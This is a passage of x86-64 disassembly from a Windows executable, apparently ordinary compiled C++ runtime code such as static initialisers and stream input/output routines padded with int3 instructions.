   14000265f:	cc                   	int3
   140002660:	48 83 ec 28          	sub    $0x28,%rsp
   140002664:	ba 02 00 00 00       	mov    $0x2,%edx
   140002669:	48 8d 0d e0 2e 08 00 	lea    0x82ee0(%rip),%rcx        # 0x140085550
   140002670:	e8 4b 8a 03 00       	call   0x14003b0c0
   140002675:	48 8d 0d c4 00 06 00 	lea    0x600c4(%rip),%rcx        # 0x140062740
   14000267c:	48 83 c4 28          	add    $0x28,%rsp
   140002680:	e9 9f 9a 03 00       	jmp    0x14003c124
   140002685:	cc                   	int3
   140002686:	cc                   	int3
   140002687:	cc                   	int3
   140002688:	cc                   	int3
   140002689:	cc                   	int3
   14000268a:	cc                   	int3
   14000268b:	cc                   	int3
   14000268c:	cc                   	int3
   14000268d:	cc                   	int3
   14000268e:	cc                   	int3
   14000268f:	cc                   	int3
   140002690:	48 83 ec 58          	sub    $0x58,%rsp
   140002694:	48 8d 05 fd 79 06 00 	lea    0x679fd(%rip),%rax        # 0x14006a098
   14000269b:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400026a0:	48 c7 44 24 48 25 00 	movq   $0x25,0x48(%rsp)
   1400026a7:	00 00 
   1400026a9:	b8 00 80 00 00       	mov    $0x8000,%eax
   1400026ae:	66 21 05 45 0b 08 00 	and    %ax,0x80b45(%rip)        # 0x1400831fa
   1400026b5:	48 8d 05 04 7a 06 00 	lea    0x67a04(%rip),%rax        # 0x14006a0c0
   1400026bc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400026c1:	48 c7 44 24 28 15 00 	movq   $0x15,0x28(%rsp)
   1400026c8:	00 00 
   1400026ca:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   1400026cf:	66 0f 7f 44 24 20    	movdqa %xmm0,0x20(%rsp)
   1400026d5:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400026da:	48 8d 0d 0f 0b 08 00 	lea    0x80b0f(%rip),%rcx        # 0x1400831f0
   1400026e1:	e8 ba 49 02 00       	call   0x1400270a0
   1400026e6:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
   1400026eb:	0f 29 05 1e 0b 08 00 	movaps %xmm0,0x80b1e(%rip)        # 0x140083210
   1400026f2:	48 83 3d 76 0b 08 00 	cmpq   $0x0,0x80b76(%rip)        # 0x140083270
   1400026f9:	00 
   1400026fa:	74 3f                	je     0x14000273b
   1400026fc:	66 c7 44 24 30 03 01 	movw   $0x103,0x30(%rsp)
   140002703:	48 8d 05 de 39 06 00 	lea    0x639de(%rip),%rax        # 0x1400660e8
   14000270a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000270f:	33 c0                	xor    %eax,%eax
   140002711:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002716:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000271b:	e8 40 35 03 00       	call   0x140035c60
   140002720:	4c 8b c8             	mov    %rax,%r9
   140002723:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002728:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000272d:	48 8d 0d bc 0a 08 00 	lea    0x80abc(%rip),%rcx        # 0x1400831f0
   140002734:	e8 e7 20 02 00       	call   0x140024820
   140002739:	eb 22                	jmp    0x14000275d
   14000273b:	48 8d 05 7e 2f 08 00 	lea    0x82f7e(%rip),%rax        # 0x1400856c0
   140002742:	48 89 05 27 0b 08 00 	mov    %rax,0x80b27(%rip)        # 0x140083270
   140002749:	c6 05 31 0b 08 00 01 	movb   $0x1,0x80b31(%rip)        # 0x140083281
   140002750:	0f b6 05 69 2f 08 00 	movzbl 0x82f69(%rip),%eax        # 0x1400856c0
   140002757:	88 05 23 0b 08 00    	mov    %al,0x80b23(%rip)        # 0x140083280
   14000275d:	0f b7 05 96 0a 08 00 	movzwl 0x80a96(%rip),%eax        # 0x1400831fa
   140002764:	ba bf ff 00 00       	mov    $0xffbf,%edx
   140002769:	66 23 c2             	and    %dx,%ax
   14000276c:	66 83 c8 20          	or     $0x20,%ax
   140002770:	66 89 05 83 0a 08 00 	mov    %ax,0x80a83(%rip)        # 0x1400831fa
   140002777:	48 8d 0d 72 0a 08 00 	lea    0x80a72(%rip),%rcx        # 0x1400831f0
   14000277e:	e8 ad 12 02 00       	call   0x140023a30
   140002783:	90                   	nop
   140002784:	48 8d 0d e5 ff 05 00 	lea    0x5ffe5(%rip),%rcx        # 0x140062770
   14000278b:	48 83 c4 58          	add    $0x58,%rsp
   14000278f:	e9 90 99 03 00       	jmp    0x14003c124
   140002794:	cc                   	int3
   140002795:	cc                   	int3
   140002796:	cc                   	int3
   140002797:	cc                   	int3
   140002798:	cc                   	int3
   140002799:	cc                   	int3
   14000279a:	cc                   	int3
   14000279b:	cc                   	int3
   14000279c:	cc                   	int3
   14000279d:	cc                   	int3
   14000279e:	cc                   	int3
   14000279f:	cc                   	int3
   1400027a0:	48 83 ec 28          	sub    $0x28,%rsp
   1400027a4:	48 8d 0d 85 30 08 00 	lea    0x83085(%rip),%rcx        # 0x140085830
   1400027ab:	e8 50 75 03 00       	call   0x140039d00
   1400027b0:	48 8d 0d 09 00 06 00 	lea    0x60009(%rip),%rcx        # 0x1400627c0
   1400027b7:	48 83 c4 28          	add    $0x28,%rsp
   1400027bb:	e9 64 99 03 00       	jmp    0x14003c124
   1400027c0:	48 8d 0d 69 00 06 00 	lea    0x60069(%rip),%rcx        # 0x140062830
   1400027c7:	e9 58 99 03 00       	jmp    0x14003c124
   1400027cc:	cc                   	int3
   1400027cd:	cc                   	int3
   1400027ce:	cc                   	int3
   1400027cf:	cc                   	int3
   1400027d0:	48 8d 0d f9 ff 05 00 	lea    0x5fff9(%rip),%rcx        # 0x1400627d0
   1400027d7:	e9 48 99 03 00       	jmp    0x14003c124
   1400027dc:	cc                   	int3
   1400027dd:	cc                   	int3
   1400027de:	cc                   	int3
   1400027df:	cc                   	int3
   1400027e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400027e4:	48 8d 0d c5 32 08 00 	lea    0x832c5(%rip),%rcx        # 0x140085ab0
   1400027eb:	e8 10 75 03 00       	call   0x140039d00
   1400027f0:	48 8d 0d b9 00 06 00 	lea    0x600b9(%rip),%rcx        # 0x1400628b0
   1400027f7:	48 83 c4 28          	add    $0x28,%rsp
   1400027fb:	e9 24 99 03 00       	jmp    0x14003c124
   140002800:	48 8d 0d 69 00 06 00 	lea    0x60069(%rip),%rcx        # 0x140062870
   140002807:	e9 18 99 03 00       	jmp    0x14003c124
   14000280c:	cc                   	int3
   14000280d:	cc                   	int3
   14000280e:	cc                   	int3
   14000280f:	cc                   	int3
   140002810:	48 83 ec 58          	sub    $0x58,%rsp
   140002814:	33 c0                	xor    %eax,%eax
   140002816:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   14000281b:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002820:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002825:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002829:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000282e:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140002832:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002837:	89 44 24 48          	mov    %eax,0x48(%rsp)
   14000283b:	e8 20 2f 00 00       	call   0x140005760
   140002840:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140002845:	48 83 c4 58          	add    $0x58,%rsp
   140002849:	c3                   	ret
   14000284a:	cc                   	int3
   14000284b:	cc                   	int3
   14000284c:	cc                   	int3
   14000284d:	cc                   	int3
   14000284e:	cc                   	int3
   14000284f:	cc                   	int3
   140002850:	48 83 ec 28          	sub    $0x28,%rsp
   140002854:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002859:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000285e:	e8 8d 31 00 00       	call   0x1400059f0
   140002863:	48 83 c4 28          	add    $0x28,%rsp
   140002867:	c3                   	ret
   140002868:	cc                   	int3
   140002869:	cc                   	int3
   14000286a:	cc                   	int3
   14000286b:	cc                   	int3
   14000286c:	cc                   	int3
   14000286d:	cc                   	int3
   14000286e:	cc                   	int3
   14000286f:	cc                   	int3
   140002870:	48 83 ec 28          	sub    $0x28,%rsp
   140002874:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140002878:	c7 01 ee 03 00 00    	movl   $0x3ee,(%rcx)
   14000287e:	48 85 c0             	test   %rax,%rax
   140002881:	74 48                	je     0x1400028cb
   140002883:	44 8b 41 04          	mov    0x4(%rcx),%r8d
   140002887:	49 c1 e0 02          	shl    $0x2,%r8
   14000288b:	49 83 f8 18          	cmp    $0x18,%r8
   14000288f:	72 1c                	jb     0x1400028ad
   140002891:	0f 10 05 48 14 06 00 	movups 0x61448(%rip),%xmm0        # 0x140063ce0
   140002898:	0f 11 00             	movups %xmm0,(%rax)
   14000289b:	f2 0f 10 0d 4d 14 06 	movsd  0x6144d(%rip),%xmm1        # 0x140063cf0
   1400028a2:	00 
   1400028a3:	f2 0f 11 48 10       	movsd  %xmm1,0x10(%rax)
   1400028a8:	48 83 c4 28          	add    $0x28,%rsp
   1400028ac:	c3                   	ret
   1400028ad:	33 d2                	xor    %edx,%edx
   1400028af:	48 8b c8             	mov    %rax,%rcx
   1400028b2:	e8 49 a7 03 00       	call   0x14003d000
   1400028b7:	e8 30 fb 03 00       	call   0x1400423ec
   1400028bc:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   1400028c2:	48 83 c4 28          	add    $0x28,%rsp
   1400028c6:	e9 b5 f9 03 00       	jmp    0x140042280
   1400028cb:	c7 41 04 06 00 00 00 	movl   $0x6,0x4(%rcx)
   1400028d2:	48 83 c4 28          	add    $0x28,%rsp
   1400028d6:	c3                   	ret
   1400028d7:	cc                   	int3
   1400028d8:	cc                   	int3
   1400028d9:	cc                   	int3
   1400028da:	cc                   	int3
   1400028db:	cc                   	int3
   1400028dc:	cc                   	int3
   1400028dd:	cc                   	int3
   1400028de:	cc                   	int3
   1400028df:	cc                   	int3
   1400028e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400028e5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400028ea:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400028ef:	57                   	push   %rdi
   1400028f0:	41 56                	push   %r14
   1400028f2:	41 57                	push   %r15
   1400028f4:	48 83 ec 40          	sub    $0x40,%rsp
   1400028f8:	48 8b f2             	mov    %rdx,%rsi
   1400028fb:	48 8b d9             	mov    %rcx,%rbx
   1400028fe:	45 33 ff             	xor    %r15d,%r15d
   140002901:	45 32 f6             	xor    %r14b,%r14b
   140002904:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140002909:	48 8b 01             	mov    (%rcx),%rax
   14000290c:	4c 63 40 04          	movslq 0x4(%rax),%r8
   140002910:	49 8b 4c 08 48       	mov    0x48(%r8,%rcx,1),%rcx
   140002915:	48 85 c9             	test   %rcx,%rcx
   140002918:	74 0e                	je     0x140002928
   14000291a:	48 8b 01             	mov    (%rcx),%rax
   14000291d:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002921:	ff 15 b9 0a 06 00    	call   *0x60ab9(%rip)        # 0x1400633e0
   140002927:	90                   	nop
   140002928:	33 d2                	xor    %edx,%edx
   14000292a:	48 8b cb             	mov    %rbx,%rcx
   14000292d:	e8 7e 7c 00 00       	call   0x14000a5b0
   140002932:	88 44 24 28          	mov    %al,0x28(%rsp)
   140002936:	84 c0                	test   %al,%al
   140002938:	0f 84 11 01 00 00    	je     0x140002a4f
   14000293e:	48 8b 03             	mov    (%rbx),%rax
   140002941:	48 63 40 04          	movslq 0x4(%rax),%rax
   140002945:	48 8b 44 18 40       	mov    0x40(%rax,%rbx,1),%rax
   14000294a:	48 8b 78 08          	mov    0x8(%rax),%rdi
   14000294e:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140002953:	48 8b 07             	mov    (%rdi),%rax
   140002956:	48 8b cf             	mov    %rdi,%rcx
   140002959:	48 8b 40 08          	mov    0x8(%rax),%rax
   14000295d:	ff 15 7d 0a 06 00    	call   *0x60a7d(%rip)        # 0x1400633e0
   140002963:	90                   	nop
   140002964:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002969:	e8 32 0c 00 00       	call   0x1400035a0
   14000296e:	48 8b e8             	mov    %rax,%rbp
   140002971:	48 85 ff             	test   %rdi,%rdi
   140002974:	74 2c                	je     0x1400029a2
   140002976:	48 8b 17             	mov    (%rdi),%rdx
   140002979:	48 8b cf             	mov    %rdi,%rcx
   14000297c:	48 8b 42 10          	mov    0x10(%rdx),%rax
   140002980:	ff 15 5a 0a 06 00    	call   *0x60a5a(%rip)        # 0x1400633e0
   140002986:	4c 8b c0             	mov    %rax,%r8
   140002989:	48 85 c0             	test   %rax,%rax
   14000298c:	74 14                	je     0x1400029a2
   14000298e:	48 8b 08             	mov    (%rax),%rcx
   140002991:	48 8b 01             	mov    (%rcx),%rax
   140002994:	ba 01 00 00 00       	mov    $0x1,%edx
   140002999:	49 8b c8             	mov    %r8,%rcx
   14000299c:	ff 15 3e 0a 06 00    	call   *0x60a3e(%rip)        # 0x1400633e0
   1400029a2:	48 8b c6             	mov    %rsi,%rax
   1400029a5:	48 83 7e 18 10       	cmpq   $0x10,0x18(%rsi)
   1400029aa:	72 03                	jb     0x1400029af
   1400029ac:	48 8b 06             	mov    (%rsi),%rax
   1400029af:	48 c7 46 10 00 00 00 	movq   $0x0,0x10(%rsi)
   1400029b6:	00 
   1400029b7:	c6 00 00             	movb   $0x0,(%rax)
   1400029ba:	48 8b 03             	mov    (%rbx),%rax
   1400029bd:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400029c1:	48 8b 7c 19 28       	mov    0x28(%rcx,%rbx,1),%rdi
   1400029c6:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400029cd:	ff ff 7f 
   1400029d0:	48 85 ff             	test   %rdi,%rdi
   1400029d3:	7e 05                	jle    0x1400029da
   1400029d5:	48 3b f8             	cmp    %rax,%rdi
   1400029d8:	72 03                	jb     0x1400029dd
   1400029da:	48 8b f8             	mov    %rax,%rdi
   1400029dd:	48 8b 4c 19 48       	mov    0x48(%rcx,%rbx,1),%rcx
   1400029e2:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400029e6:	48 8b 10             	mov    (%rax),%rdx
   1400029e9:	48 85 d2             	test   %rdx,%rdx
   1400029ec:	74 0e                	je     0x1400029fc
   1400029ee:	48 8b 41 50          	mov    0x50(%rcx),%rax
   1400029f2:	83 38 00             	cmpl   $0x0,(%rax)
   1400029f5:	7e 05                	jle    0x1400029fc
   1400029f7:	0f b6 02             	movzbl (%rdx),%eax
   1400029fa:	eb 0d                	jmp    0x140002a09
   1400029fc:	48 8b 01             	mov    (%rcx),%rax
   1400029ff:	48 8b 40 30          	mov    0x30(%rax),%rax
   140002a03:	ff 15 d7 09 06 00    	call   *0x609d7(%rip)        # 0x1400633e0
   140002a09:	48 85 ff             	test   %rdi,%rdi
   140002a0c:	74 41                	je     0x140002a4f
   140002a0e:	66 90                	xchg   %ax,%ax
   140002a10:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002a13:	74 34                	je     0x140002a49
   140002a15:	0f b6 c8             	movzbl %al,%ecx
   140002a18:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140002a1c:	f6 04 48 48          	testb  $0x48,(%rax,%rcx,2)
   140002a20:	75 2d                	jne    0x140002a4f
   140002a22:	0f b6 d1             	movzbl %cl,%edx
   140002a25:	48 8b ce             	mov    %rsi,%rcx
   140002a28:	e8 33 87 00 00       	call   0x14000b160
   140002a2d:	41 b6 01             	mov    $0x1,%r14b
   140002a30:	48 8b 03             	mov    (%rbx),%rax
   140002a33:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002a37:	48 8b 4c 19 48       	mov    0x48(%rcx,%rbx,1),%rcx
   140002a3c:	e8 9f 8e 00 00       	call   0x14000b8e0
   140002a41:	48 83 ef 01          	sub    $0x1,%rdi
   140002a45:	75 c9                	jne    0x140002a10
   140002a47:	eb 06                	jmp    0x140002a4f
   140002a49:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   140002a4f:	48 8b 03             	mov    (%rbx),%rax
   140002a52:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002a56:	48 c7 44 19 28 00 00 	movq   $0x0,0x28(%rcx,%rbx,1)
   140002a5d:	00 00 
   140002a5f:	48 8b 03             	mov    (%rbx),%rax
   140002a62:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002a66:	48 03 cb             	add    %rbx,%rcx
   140002a69:	41 8b d7             	mov    %r15d,%edx
   140002a6c:	83 ca 02             	or     $0x2,%edx
   140002a6f:	45 84 f6             	test   %r14b,%r14b
   140002a72:	41 0f 45 d7          	cmovne %r15d,%edx
   140002a76:	45 33 c0             	xor    %r8d,%r8d
   140002a79:	e8 d2 8d 00 00       	call   0x14000b850
   140002a7e:	90                   	nop
   140002a7f:	48 8b 03             	mov    (%rbx),%rax
   140002a82:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002a86:	48 8b 4c 19 48       	mov    0x48(%rcx,%rbx,1),%rcx
   140002a8b:	48 85 c9             	test   %rcx,%rcx
   140002a8e:	74 0e                	je     0x140002a9e
   140002a90:	48 8b 01             	mov    (%rcx),%rax
   140002a93:	48 8b 40 10          	mov    0x10(%rax),%rax
   140002a97:	ff 15 43 09 06 00    	call   *0x60943(%rip)        # 0x1400633e0
   140002a9d:	90                   	nop
   140002a9e:	48 8b c3             	mov    %rbx,%rax
   140002aa1:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140002aa6:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140002aab:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140002ab0:	48 83 c4 40          	add    $0x40,%rsp
   140002ab4:	41 5f                	pop    %r15
   140002ab6:	41 5e                	pop    %r14
   140002ab8:	5f                   	pop    %rdi
   140002ab9:	c3                   	ret
   140002aba:	cc                   	int3
   140002abb:	cc                   	int3
   140002abc:	cc                   	int3
   140002abd:	cc                   	int3
   140002abe:	cc                   	int3
   140002abf:	cc                   	int3
   140002ac0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002ac5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140002aca:	56                   	push   %rsi
   140002acb:	57                   	push   %rdi
   140002acc:	41 56                	push   %r14
   140002ace:	48 83 ec 30          	sub    $0x30,%rsp
   140002ad2:	4c 8b f2             	mov    %rdx,%r14
   140002ad5:	48 8b f9             	mov    %rcx,%rdi
   140002ad8:	33 ed                	xor    %ebp,%ebp
   140002ada:	48 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%rsi
   140002ae1:	48 ff c6             	inc    %rsi
   140002ae4:	40 38 2c 32          	cmp    %bpl,(%rdx,%rsi,1)
   140002ae8:	75 f7                	jne    0x140002ae1
   140002aea:	48 8b 01             	mov    (%rcx),%rax
   140002aed:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002af1:	48 8b 5c 39 28       	mov    0x28(%rcx,%rdi,1),%rbx
   140002af6:	48 85 db             	test   %rbx,%rbx
   140002af9:	7e 0a                	jle    0x140002b05
   140002afb:	48 3b de             	cmp    %rsi,%rbx
   140002afe:	7e 05                	jle    0x140002b05
   140002b00:	48 2b de             	sub    %rsi,%rbx
   140002b03:	eb 02                	jmp    0x140002b07
   140002b05:	33 db                	xor    %ebx,%ebx
   140002b07:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002b0c:	48 8b 4c 39 48       	mov    0x48(%rcx,%rdi,1),%rcx
   140002b11:	48 85 c9             	test   %rcx,%rcx
   140002b14:	74 0e                	je     0x140002b24
   140002b16:	48 8b 01             	mov    (%rcx),%rax
   140002b19:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002b1d:	ff 15 bd 08 06 00    	call   *0x608bd(%rip)        # 0x1400633e0
   140002b23:	90                   	nop
   140002b24:	48 8b 0f             	mov    (%rdi),%rcx
   140002b27:	48 63 41 04          	movslq 0x4(%rcx),%rax
   140002b2b:	83 7c 38 10 00       	cmpl   $0x0,0x10(%rax,%rdi,1)
   140002b30:	74 04                	je     0x140002b36
   140002b32:	32 c0                	xor    %al,%al
   140002b34:	eb 2a                	jmp    0x140002b60
   140002b36:	48 8b 44 38 50       	mov    0x50(%rax,%rdi,1),%rax
   140002b3b:	48 85 c0             	test   %rax,%rax
   140002b3e:	74 1e                	je     0x140002b5e
   140002b40:	48 3b c7             	cmp    %rdi,%rax
   140002b43:	74 19                	je     0x140002b5e
   140002b45:	48 8b c8             	mov    %rax,%rcx
   140002b48:	e8 e3 81 00 00       	call   0x14000ad30
   140002b4d:	48 8b 0f             	mov    (%rdi),%rcx
   140002b50:	48 63 41 04          	movslq 0x4(%rcx),%rax
   140002b54:	83 7c 38 10 00       	cmpl   $0x0,0x10(%rax,%rdi,1)
   140002b59:	0f 94 c0             	sete   %al
   140002b5c:	eb 02                	jmp    0x140002b60
   140002b5e:	b0 01                	mov    $0x1,%al
   140002b60:	88 44 24 28          	mov    %al,0x28(%rsp)
   140002b64:	84 c0                	test   %al,%al
   140002b66:	75 0a                	jne    0x140002b72
   140002b68:	bd 04 00 00 00       	mov    $0x4,%ebp
   140002b6d:	e9 2a 01 00 00       	jmp    0x140002c9c
   140002b72:	48 63 41 04          	movslq 0x4(%rcx),%rax
   140002b76:	8b 4c 38 18          	mov    0x18(%rax,%rdi,1),%ecx
   140002b7a:	81 e1 c0 01 00 00    	and    $0x1c0,%ecx
   140002b80:	83 f9 40             	cmp    $0x40,%ecx
   140002b83:	74 6b                	je     0x140002bf0
   140002b85:	48 85 db             	test   %rbx,%rbx
   140002b88:	7e 66                	jle    0x140002bf0
   140002b8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002b90:	48 8b 07             	mov    (%rdi),%rax
   140002b93:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002b97:	4c 8b 44 39 48       	mov    0x48(%rcx,%rdi,1),%r8
   140002b9c:	44 0f b6 4c 39 58    	movzbl 0x58(%rcx,%rdi,1),%r9d
   140002ba2:	49 8b 40 40          	mov    0x40(%r8),%rax
   140002ba6:	48 83 38 00          	cmpq   $0x0,(%rax)
   140002baa:	74 24                	je     0x140002bd0
   140002bac:	49 8b 48 58          	mov    0x58(%r8),%rcx
   140002bb0:	8b 01                	mov    (%rcx),%eax
   140002bb2:	85 c0                	test   %eax,%eax
   140002bb4:	7e 1a                	jle    0x140002bd0
   140002bb6:	ff c8                	dec    %eax
   140002bb8:	89 01                	mov    %eax,(%rcx)
   140002bba:	49 8b 48 40          	mov    0x40(%r8),%rcx
   140002bbe:	48 8b 11             	mov    (%rcx),%rdx
   140002bc1:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140002bc5:	48 89 01             	mov    %rax,(%rcx)
   140002bc8:	44 88 0a             	mov    %r9b,(%rdx)
   140002bcb:	41 8b c1             	mov    %r9d,%eax
   140002bce:	eb 13                	jmp    0x140002be3
   140002bd0:	49 8b 00             	mov    (%r8),%rax
   140002bd3:	41 8b d1             	mov    %r9d,%edx
   140002bd6:	49 8b c8             	mov    %r8,%rcx
   140002bd9:	48 8b 40 18          	mov    0x18(%rax),%rax
   140002bdd:	ff 15 fd 07 06 00    	call   *0x607fd(%rip)        # 0x1400633e0
   140002be3:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002be6:	74 78                	je     0x140002c60
   140002be8:	48 ff cb             	dec    %rbx
   140002beb:	48 85 db             	test   %rbx,%rbx
   140002bee:	7f a0                	jg     0x140002b90
   140002bf0:	48 8b 07             	mov    (%rdi),%rax
   140002bf3:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002bf7:	48 8b 4c 39 48       	mov    0x48(%rcx,%rdi,1),%rcx
   140002bfc:	48 8b 01             	mov    (%rcx),%rax
   140002bff:	4c 8b c6             	mov    %rsi,%r8
   140002c02:	49 8b d6             	mov    %r14,%rdx
   140002c05:	48 8b 40 48          	mov    0x48(%rax),%rax
   140002c09:	ff 15 d1 07 06 00    	call   *0x607d1(%rip)        # 0x1400633e0
   140002c0f:	48 3b c6             	cmp    %rsi,%rax
   140002c12:	75 75                	jne    0x140002c89
   140002c14:	48 85 db             	test   %rbx,%rbx
   140002c17:	7e 73                	jle    0x140002c8c
   140002c19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002c20:	48 8b 07             	mov    (%rdi),%rax
   140002c23:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002c27:	4c 8b 44 39 48       	mov    0x48(%rcx,%rdi,1),%r8
   140002c2c:	44 0f b6 4c 39 58    	movzbl 0x58(%rcx,%rdi,1),%r9d
   140002c32:	49 8b 40 40          	mov    0x40(%r8),%rax
   140002c36:	48 83 38 00          	cmpq   $0x0,(%rax)
   140002c3a:	74 2b                	je     0x140002c67
   140002c3c:	49 8b 48 58          	mov    0x58(%r8),%rcx
   140002c40:	8b 01                	mov    (%rcx),%eax
   140002c42:	85 c0                	test   %eax,%eax
   140002c44:	7e 21                	jle    0x140002c67
   140002c46:	ff c8                	dec    %eax
   140002c48:	89 01                	mov    %eax,(%rcx)
   140002c4a:	49 8b 48 40          	mov    0x40(%r8),%rcx
   140002c4e:	48 8b 11             	mov    (%rcx),%rdx
   140002c51:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140002c55:	48 89 01             	mov    %rax,(%rcx)
   140002c58:	44 88 0a             	mov    %r9b,(%rdx)
   140002c5b:	41 8b c1             	mov    %r9d,%eax
   140002c5e:	eb 1a                	jmp    0x140002c7a
   140002c60:	bd 04 00 00 00       	mov    $0x4,%ebp
   140002c65:	eb 25                	jmp    0x140002c8c
   140002c67:	49 8b 00             	mov    (%r8),%rax
   140002c6a:	41 8b d1             	mov    %r9d,%edx
   140002c6d:	49 8b c8             	mov    %r8,%rcx
   140002c70:	48 8b 40 18          	mov    0x18(%rax),%rax
   140002c74:	ff 15 66 07 06 00    	call   *0x60766(%rip)        # 0x1400633e0
   140002c7a:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002c7d:	74 0a                	je     0x140002c89
   140002c7f:	48 ff cb             	dec    %rbx
   140002c82:	48 85 db             	test   %rbx,%rbx
   140002c85:	7f 99                	jg     0x140002c20
   140002c87:	eb 03                	jmp    0x140002c8c
   140002c89:	83 cd 04             	or     $0x4,%ebp
   140002c8c:	48 8b 07             	mov    (%rdi),%rax
   140002c8f:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002c93:	48 c7 44 39 28 00 00 	movq   $0x0,0x28(%rcx,%rdi,1)
   140002c9a:	00 00 
   140002c9c:	48 8b 07             	mov    (%rdi),%rax
   140002c9f:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002ca3:	48 03 cf             	add    %rdi,%rcx
   140002ca6:	45 33 c0             	xor    %r8d,%r8d
   140002ca9:	8b d5                	mov    %ebp,%edx
   140002cab:	e8 a0 8b 00 00       	call   0x14000b850
   140002cb0:	90                   	nop
   140002cb1:	48 8b 07             	mov    (%rdi),%rax
   140002cb4:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002cb8:	83 7c 39 10 00       	cmpl   $0x0,0x10(%rcx,%rdi,1)
   140002cbd:	75 35                	jne    0x140002cf4
   140002cbf:	f6 44 39 18 02       	testb  $0x2,0x18(%rcx,%rdi,1)
   140002cc4:	74 2e                	je     0x140002cf4
   140002cc6:	48 8b 4c 39 48       	mov    0x48(%rcx,%rdi,1),%rcx
   140002ccb:	48 8b 01             	mov    (%rcx),%rax
   140002cce:	48 8b 40 68          	mov    0x68(%rax),%rax
   140002cd2:	ff 15 08 07 06 00    	call   *0x60708(%rip)        # 0x1400633e0
   140002cd8:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002cdb:	75 17                	jne    0x140002cf4
   140002cdd:	48 8b 07             	mov    (%rdi),%rax
   140002ce0:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002ce4:	48 03 cf             	add    %rdi,%rcx
   140002ce7:	45 33 c0             	xor    %r8d,%r8d
   140002cea:	41 8d 50 04          	lea    0x4(%r8),%edx
   140002cee:	e8 5d 8b 00 00       	call   0x14000b850
   140002cf3:	90                   	nop
   140002cf4:	48 8b 07             	mov    (%rdi),%rax
   140002cf7:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002cfb:	48 8b 4c 39 48       	mov    0x48(%rcx,%rdi,1),%rcx
   140002d00:	48 85 c9             	test   %rcx,%rcx
   140002d03:	74 0e                	je     0x140002d13
   140002d05:	48 8b 01             	mov    (%rcx),%rax
   140002d08:	48 8b 40 10          	mov    0x10(%rax),%rax
   140002d0c:	ff 15 ce 06 06 00    	call   *0x606ce(%rip)        # 0x1400633e0
   140002d12:	90                   	nop
   140002d13:	48 8b c7             	mov    %rdi,%rax
   140002d16:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140002d1b:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140002d20:	48 83 c4 30          	add    $0x30,%rsp
   140002d24:	41 5e                	pop    %r14
   140002d26:	5f                   	pop    %rdi
   140002d27:	5e                   	pop    %rsi
   140002d28:	c3                   	ret
   140002d29:	cc                   	int3
   140002d2a:	cc                   	int3
   140002d2b:	cc                   	int3
   140002d2c:	cc                   	int3
   140002d2d:	cc                   	int3
   140002d2e:	cc                   	int3
   140002d2f:	cc                   	int3
   140002d30:	48 83 ec 28          	sub    $0x28,%rsp
   140002d34:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
